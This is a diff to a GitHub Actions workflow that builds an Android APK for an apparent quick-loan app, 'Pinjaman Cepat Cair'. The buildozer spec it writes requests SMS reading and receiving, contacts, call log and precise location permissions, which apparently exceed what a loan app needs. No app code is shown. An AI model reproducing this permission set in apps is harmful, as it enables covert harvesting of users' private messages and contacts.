@@ -1,32 +1,69 @@
-name: Check Files
+
+name: Build APK Final
 
 on:
   workflow_dispatch:
 
 jobs:
-  check:
+  build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       
-      - name: Check main.py
+      - name: Fix buildozer.spec
         run: |
-          echo "📄 MAIN.PY:"
-          ls -la main.py
-          echo "Jumlah baris:"
-          wc -l main.py
-          echo "20 baris pertama:"
-          head -n 20 main.py
-      
-      - name: Check buildozer.spec
-        run: |
-          echo "📄 BUILDOZER.SPEC:"
+          cat > buildozer.spec << 'EOF'
+          [app]
+          title = Pinjaman Cepat Cair
+          package.name = pinjolcepat
+          package.domain = com.pinjol.cepat
+          source.dir = .
+          source.include_exts = py,png,jpg,kv,ttf,json
+          version = 1.0.0
+          requirements = python3,kivy==2.1.0,requests,android,pyjnius,prctl
+          orientation = portrait
+          osx.python_version = 3
+          osx.kivy_version = 2.1.0
+          fullscreen = 0
+
+          [buildozer]
+          log_level = 2
+          warn_on_root = 1
+
+          [android]
+          api = 31
+          minapi = 21
+          ndk = 25b
+          permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
+          android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
+          android.api = 31
+          android.minapi = 21
+          android.ndk = 25b
+          android.gradle_dependencies = 'androidx.core:core:1.9.0'
+          EOF
+          echo "✅ buildozer.spec fixed"
           cat buildozer.spec
       
-      - name: Try build (quick check)
+      - name: Install dependencies
         run: |
-          buildozer android debug || echo "Build failed but continuing..."
-          echo "🔍 Mencari APK:"
-          find . -name "*.apk"
-          echo "📁 Isi folder bin:"
-          ls -la bin/ || echo "Folder bin tidak ada"
+          sudo apt-get update
+          sudo apt-get install -y python3-pip git unzip openjdk-17-jdk
+          pip3 install --user buildozer cython virtualenv
+          echo "$HOME/.local/bin" >> $GITHUB_PATH
+      
+      - name: Build APK
+        run: |
+          export USER=runner
+          buildozer android debug || true
+          echo "🔍 Mencari APK..."
+          find $PWD -name "*.apk" -type f
+          ls -la bin/ || echo "bin folder tidak ada"
+      
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: RNSMV2-APK-FINAL
+          path: |
+            bin/*.apk
+            **/*.apk
+          if-no-files-found: warn
